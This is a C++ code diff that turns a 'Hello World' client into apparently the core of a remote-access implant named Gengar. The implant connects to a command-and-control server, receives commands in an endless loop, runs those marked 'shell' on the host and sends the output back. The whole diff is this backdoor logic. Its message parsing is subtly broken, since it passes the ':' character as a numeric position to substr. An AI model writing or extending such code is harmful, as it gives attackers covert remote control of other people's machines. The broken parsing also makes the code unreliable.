@@ -1,9 +1,30 @@
-#include <iostream>
-#include "client.h"
+#include <string>
+#include "gengar.h"
 
-int main()
+void Gengar::ListenForCommand()
 {
-	Client client;
-	client.Connect();
-	client.Send("Hello World!");
+	char type_content_delimiter = ':';
+
+	while (true)
+	{
+		std::string input = m_client.Receive();
+		std::string type = input.substr(0, type_content_delimiter);
+		std::string content = input.substr(type_content_delimiter, input.size());
+		RouteCommand(type, content);
+	}
+}
+
+void Gengar::RouteCommand(std::string& type, std::string& content)
+{
+	std::string output;
+	if (type == "shell")
+	{
+		output = m_machine.RunShellCommand(content);
+	}
+	m_client.Send(output);
+}
+
+void Gengar::ConnectToCnc()
+{
+	m_client.Connect();
 }
